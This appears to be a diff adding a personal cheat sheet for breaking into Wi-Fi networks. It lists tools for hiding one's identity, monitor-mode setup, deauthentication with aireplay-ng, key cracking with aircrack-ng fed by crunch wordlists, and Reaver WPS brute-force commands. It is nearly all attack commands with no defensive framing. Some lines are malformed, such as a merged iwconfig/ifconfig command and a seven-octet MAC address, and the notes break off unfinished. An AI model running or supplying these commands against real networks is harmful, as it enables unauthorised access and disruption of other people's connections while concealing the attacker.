@@ -1,0 +1,54 @@
+[Anonimity]
+
+- macchanger
+- tor-proxy
+- proxychains 
+
+[Configure NIC into Monitor Mode]
+
+- ifconfig wlan0 down
+- iwconfig wlan0 mod monitor- ifconfig wlan0 up
+- airmon-ng check wlan0
+
+[WEP]
+
+airodump-ng wlan0mon
+airodump-ng -c[CHANNEL] -w[FILE] --bssid[BSSID] wlan0mon
+aireplay-ng -0 4 -a [MAC] wlan0mon
+aircrack-ng -w[wordlist] file.cap
+
+[Crunch + Aircrack]
+
+Crunch generates wordlists in both combination and permutation ways
+
+------------------------------------------------------------------------------------------------------------
+- crunch -t 12 12 %%%%Password 1234567890 | aircrack-ng -w - file.cap -e ESSID_NAME
+
+- crunch 12 12 %%%%Password -f charset.lst mixalpha-numeric-space| aircrack-ng -w - file.cap -e ESSID_NAME
+
+- crunch 12 12 %%%%@@@sword -f charset.lst mixalpha-numeric-space| aircrack-ng -w - file.cap -e ESSID_NAME
+
+- crunch 10 10 -t 123%%%%%%% -o /root/Desktop/areacode123.txt
+
+------------------------------------------------------------------------------------------------------------
+
+[Reaver]
+
+- reaver -i wlan0mon -b 00:11:22:33:44:55:66
+- reaver -i moninterface -b bssid -vv
+- reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -vv
+
+
+
+-------------------------------------------------------------------------
+BSSID   PWR   BEACONS  #DATA   #/s    CH   MB   ENC  CIPHER  AUTH  ESSID
+-------------------------------------------------------------------------
+
+
+[NOTES]
+
+- Crunch: When have some idea of the password.
+- 12 12: Password's Lenght.
+- %: Insert Numbers (%%%%Password = 1101Password)
+- ^:
+- ,:
